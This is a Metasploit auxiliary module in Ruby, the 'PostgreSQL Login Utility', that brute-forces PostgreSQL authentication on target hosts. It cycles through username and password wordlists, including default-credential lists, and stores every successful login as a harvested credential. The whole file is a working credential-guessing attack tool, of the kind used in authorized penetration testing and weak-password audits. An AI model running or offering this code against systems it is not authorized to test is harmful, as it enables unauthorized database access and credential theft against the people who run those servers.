##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/postgres'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Creates an instance of this module.
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PostgreSQL Login Utility',
      'Description'    => %q{
        This module attempts to authenticate against a PostgreSQL
        instance using username and password combinations indicated
        by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
      },
      'Author'         => [ 'todb' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.postgresql.org' ],
          [ 'CVE', '1999-0502'] # Weak password
        ]
    ))

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing (space-seperated) users and passwords, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_userpass.txt") ]),
        OptPath.new('USER_FILE',      [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_user.txt") ]),
        OptPath.new('PASS_FILE',      [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_pass.txt") ]),
      ], self.class)

    deregister_options('SQL')

  end

  # Loops through each host in turn. Note the current IP address is both
  # ip and datastore['RHOST']
  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
        realm: datastore['DATABASE']
    )

    scanner = Metasploit::Framework::LoginScanner::Postgres.new(
      host: ip,
      port: rport,
      proxies: datastore['PROXIES'],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: 30
    )

    service_data = {
      address: ip,
      port: rport,
      service_name: 'postgres',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    scanner.scan! do |result|
      if result.success?
        credential_data = {
          module_fullname: self.fullname,
          origin_type: :service,
          private_data: result.credential.private,
          private_type: :password,
          realm_key: Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
          realm_value: result.credential.realm,
          username: result.credential.public
        }
        credential_data.merge!(service_data)

        credential_core = create_credential(credential_data)

        login_data = {
            core: credential_core,
            last_attempted_at: DateTime.now,
            status: Metasploit::Model::Login::Status::SUCCESSFUL
        }
        login_data.merge!(service_data)

        create_credential_login(login_data)
        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
            realm_value: result.credential.realm,
            status: result.status)
        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end

  end

  # Alias for RHOST
  def rhost
    datastore['RHOST']
  end

  # Alias for RPORT
  def rport
    datastore['RPORT']
  end



end
